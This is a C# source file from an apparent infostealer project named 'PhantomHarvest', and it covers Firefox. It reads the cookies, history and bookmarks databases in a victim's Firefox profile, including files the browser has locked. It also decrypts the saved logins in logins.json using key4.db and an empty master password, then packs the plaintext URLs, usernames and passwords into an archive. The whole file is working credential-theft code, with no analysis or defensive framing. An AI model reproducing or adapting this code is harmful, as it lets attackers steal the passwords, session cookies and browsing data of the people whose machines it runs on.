using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Browsers
{
	// Token: 0x02000036 RID: 54
	internal static class FireFox
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				if (!Directory.Exists(FireFox.BrowserPath)) return;

				string passwords = FireFox.FireFox_passwords();
				if (!string.IsNullOrEmpty(passwords))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(passwords)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, FireFox.BrowserName + "/passwords.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string FireFox_cookies()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string[] directories = Directory.GetDirectories(FireFox.BrowserPath);
			for (int i = 0; i < directories.Length; i++)
			{
				string text = Path.Combine(directories[i], "cookies.sqlite");
				if (File.Exists(text))
				{
					try
					{
						byte[] dbBytes = LockedFile.ReadLockedFile(text);
						if (dbBytes == null) continue;

						DataParser sqliteHandler = new DataParser(dbBytes);
						
						// Check for WAL
						string walPath = text + "-wal";
						if (File.Exists(walPath))
						{
							try
							{
								byte[] walBytes = LockedFile.ReadLockedFile(walPath);
								if (walBytes != null) sqliteHandler.ApplyWal(walBytes);
							}
							catch {}
						}
						
						if (!sqliteHandler.ReadTable("moz_cookies"))
						{
							continue;
						}
						for (int j = 0; j < sqliteHandler.GetRowCount(); j++)
						{
							string value = sqliteHandler.GetValue(j, "host");
							string value2 = sqliteHandler.GetValue(j, "name");
							string value3 = sqliteHandler.GetValue(j, "value");
							stringBuilder.AppendLine(string.Concat(new string[]
							{
								"[",
								value,
								"] \t {",
								value2,
								"}={",
								value3,
								"}"
							}));
						}
					}
					catch
					{
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string FireFox_history()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string[] directories = Directory.GetDirectories(FireFox.BrowserPath);
			for (int i = 0; i < directories.Length; i++)
			{
				string text = Path.Combine(directories[i], "places.sqlite");
				if (File.Exists(text))
				{
					try
					{
						byte[] dbBytes = LockedFile.ReadLockedFile(text);
						if (dbBytes == null) continue;

						DataParser sqliteHandler = new DataParser(dbBytes);
						
						// Check for WAL
						string walPath = text + "-wal";
						if (File.Exists(walPath))
						{
							try
							{
								byte[] walBytes = LockedFile.ReadLockedFile(walPath);
								if (walBytes != null) sqliteHandler.ApplyWal(walBytes);
							}
							catch {}
						}

						if (!sqliteHandler.ReadTable("moz_places"))
						{
							continue;
						}
						for (int j = 0; j < sqliteHandler.GetRowCount(); j++)
						{
							string value = sqliteHandler.GetValue(j, "url");
							stringBuilder.AppendLine(value);
						}
					}
					catch
					{
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string FireFox_books()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string[] directories = Directory.GetDirectories(FireFox.BrowserPath);
			for (int i = 0; i < directories.Length; i++)
			{
				string text = Path.Combine(directories[i], "places.sqlite");
				if (File.Exists(text))
				{
					try
					{
						byte[] dbBytes = LockedFile.ReadLockedFile(text);
						if (dbBytes == null) continue;

						DataParser sqliteHandler = new DataParser(dbBytes);
						
						// Check for WAL
						string walPath = text + "-wal";
						if (File.Exists(walPath))
						{
							try
							{
								byte[] walBytes = LockedFile.ReadLockedFile(walPath);
								if (walBytes != null) sqliteHandler.ApplyWal(walBytes);
							}
							catch {}
						}

						if (!sqliteHandler.ReadTable("moz_bookmarks"))
						{
							continue;
						}
						List<string> list = new List<string>();
						for (int j = 0; j < sqliteHandler.GetRowCount(); j++)
						{
							string value = sqliteHandler.GetValue(j, "fk");
							if (value != "0")
							{
								list.Add(value);
							}
						}
						
						// Re-initialize for reading another table from the same DB bytes
						// Since SQLiteHandler parses everything in constructor, we can reuse the object if we didn't modify it,
						// but ReadTable might change internal state. Let's check SQLiteHandler implementation.
						// SQLiteHandler reads all tables in constructor. ReadTable just sets current table index.
						// So we can reuse it.
						
						if (!sqliteHandler.ReadTable("moz_places"))
						{
							continue;
						}
						for (int k = 0; k < sqliteHandler.GetRowCount(); k++)
						{
							if (list.Contains(sqliteHandler.GetRawID(k).ToString()))
							{
								stringBuilder.AppendLine(sqliteHandler.GetValue(k, "url"));
							}
						}
					}
					catch
					{
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string FireFox_passwords()
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (string path in Directory.GetDirectories(FireFox.BrowserPath))
			{
				string text = Path.Combine(path, "logins.json");
				string text2 = Path.Combine(path, "key4.db");
				if (File.Exists(text) && File.Exists(text2))
				{
					try
					{
						byte[] key4Bytes = LockedFile.ReadLockedFile(text2);
						if (key4Bytes == null) continue;
						
						// logins.json is just a text file
						string loginsJsonContent;
						try 
						{
							byte[] loginsBytes = LockedFile.ReadLockedFile(text);
							loginsJsonContent = loginsBytes != null ? Encoding.UTF8.GetString(loginsBytes) : File.ReadAllText(text);
						}
						catch { continue; }

						DataParser sqliteHandler = new DataParser(key4Bytes);
						
						// Check for WAL
						string walPath = text2 + "-wal";
						if (File.Exists(walPath))
						{
							try
							{
								byte[] walBytes = LockedFile.ReadLockedFile(walPath);
								if (walBytes != null) sqliteHandler.ApplyWal(walBytes);
							}
							catch {}
						}

						if (!sqliteHandler.ReadTable("metadata"))
						{
							continue;
						}
						Asn1Der asn1Der = new Asn1Der();
						for (int j = 0; j < sqliteHandler.GetRowCount(); j++)
						{
							if (!(sqliteHandler.GetValue(j, "id") != "password"))
							{
								byte[] globalSalt = Convert.FromBase64String(sqliteHandler.GetValue(j, "item1"));
								byte[] dataToParse;
								try
								{
									dataToParse = Convert.FromBase64String(sqliteHandler.GetValue(j, "item2"));
								}
								catch
								{
									dataToParse = Convert.FromBase64String(sqliteHandler.GetValue(j, "item2)"));
								}
								Asn1DerObject asn1DerObject = asn1Der.Parse(dataToParse);
								string text3 = asn1DerObject.ToString();
								if (text3.Contains("2A864886F70D010C050103"))
								{
									byte[] data = asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data;
									byte[] bytes = new decryptMoz3DES(asn1DerObject.objects[0].objects[1].Data, globalSalt, Encoding.ASCII.GetBytes(FireFox.masterPassword), data).Compute();
									if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes).StartsWith("password-check"))
									{
										continue;
									}
								}
								else
								{
									if (!text3.Contains("2A864886F70D01050D"))
									{
										continue;
									}
									byte[] data2 = asn1DerObject.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
									byte[] data3 = asn1DerObject.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
									byte[] bytes2 = new MozillaPBE(asn1DerObject.objects[0].objects[0].objects[1].objects[3].Data, globalSalt, Encoding.ASCII.GetBytes(FireFox.masterPassword), data2, data3).Compute();
									if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes2).StartsWith("password-check"))
									{
										continue;
									}
								}
								try
								{
									// Re-read table from same handler
									if (!sqliteHandler.ReadTable("nssPrivate"))
									{
										continue;
									}
									for (int k = 0; k < sqliteHandler.GetRowCount(); k++)
									{
										byte[] dataToParse2 = Convert.FromBase64String(sqliteHandler.GetValue(k, "a11"));
										Asn1DerObject asn1DerObject2 = asn1Der.Parse(dataToParse2);
										byte[] data4 = asn1DerObject2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
										byte[] data5 = asn1DerObject2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
										Array sourceArray = new MozillaPBE(asn1DerObject2.objects[0].objects[0].objects[1].objects[3].Data, globalSalt, Encoding.ASCII.GetBytes(FireFox.masterPassword), data4, data5).Compute();
										byte[] array = new byte[24];
										Array.Copy(sourceArray, array, array.Length);
										stringBuilder.Append(FireFox.decryptLogins(loginsJsonContent, array));
									}
								}
								catch
								{
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string decryptLogins(string loginsJsonContent, byte[] privateKey)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Asn1Der asn1Der = new Asn1Der();
			Login[] array = FireFox.ParseLoginItems(loginsJsonContent);
			if (array.Length == 0)
			{
				return null;
			}
			foreach (Login login in array)
			{
				Asn1DerObject asn1DerObject = asn1Der.Parse(Convert.FromBase64String(login.encryptedUsername));
				Asn1DerObject asn1DerObject2 = asn1Der.Parse(Convert.FromBase64String(login.encryptedPassword));
				string hostname = login.hostname;
				string input = TripleDESHelper.DESCBCDecryptor(privateKey, asn1DerObject.objects[0].objects[1].objects[1].Data, asn1DerObject.objects[0].objects[2].Data);
				string input2 = TripleDESHelper.DESCBCDecryptor(privateKey, asn1DerObject2.objects[0].objects[1].objects[1].Data, asn1DerObject2.objects[0].objects[2].Data);
				stringBuilder.Append(string.Concat(new string[]
				{
					"\t[URL] -> {",
					hostname,
					"}\n\t[USERNAME] -> {",
					Regex.Replace(input, "[^\\u0020-\\u007F]", ""),
					"}\n\t[PASSWORD] -> {",
					Regex.Replace(input2, "[^\\u0020-\\u007F]", ""),
					"}\n"
				}));
				stringBuilder.AppendLine();
			}
			return stringBuilder.ToString();
		}

		public static Login[] ParseLoginFile(string path)
		{
			string text = File.ReadAllText(path);
			return ParseLoginItems(text);
		}

		public static Login[] ParseLoginItems(string loginJSON)
		{
			// Extract array part if needed
			int num = loginJSON.IndexOf('[');
			int num2 = loginJSON.LastIndexOf(']');
			if (num != -1 && num2 != -1)
			{
				loginJSON = loginJSON.Substring(num + 1, num2 - (num + 1));
			}

			num = loginJSON.IndexOf('{');
			List<Login> list = new List<Login>();
			string[] array = new string[]
			{
				"id",
				"encType",
				"timesUsed"
			};
			string[] array2 = new string[]
			{
				"timeCreated",
				"timeLastUsed",
				"timePasswordChanged"
			};
			while (num != -1)
			{
				int startIndex = loginJSON.IndexOf("encType", num);
				int num3 = loginJSON.IndexOf('}', startIndex);
				Login login = new Login();
				string text = "";
				for (int i = num + 1; i < num3; i++)
				{
					text += loginJSON[i].ToString();
				}
				text = text.Replace("\"", "");
				string[] array3 = text.Split(new char[]
				{
					','
				});
				for (int j = 0; j < array3.Length; j++)
				{
					string[] array4 = array3[j].Split(new char[]
					{
						':'
					}, 2);
					string text2 = array4[0];
					string text3 = array4[1];
					if (text3 == "null")
					{
						login.GetType().GetProperty(text2).SetValue(login, null, null);
					}
					if (Array.IndexOf<string>(array, text2) > -1)
					{
						login.GetType().GetProperty(text2).SetValue(login, int.Parse(text3), null);
					}
					else if (Array.IndexOf<string>(array2, text2) > -1)
					{
						login.GetType().GetProperty(text2).SetValue(login, long.Parse(text3), null);
					}
					else
					{
						login.GetType().GetProperty(text2).SetValue(login, text3, null);
					}
				}
				list.Add(login);
				num = loginJSON.IndexOf('{', num3);
			}
			return list.ToArray();
		}

		public static string BrowserName = "FireFox";
		public static string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles");
		public static string masterPassword = "";
	}
}
